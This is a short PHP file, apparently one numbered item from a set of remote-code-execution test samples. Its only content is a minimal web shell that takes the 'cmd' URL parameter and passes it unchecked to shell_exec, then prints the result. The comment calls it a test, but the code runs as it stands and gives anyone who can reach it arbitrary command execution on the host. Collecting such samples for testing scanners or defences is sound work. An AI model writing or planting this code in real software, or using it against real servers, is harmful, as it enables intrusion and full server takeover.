<?php
// RCE test variation #737
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>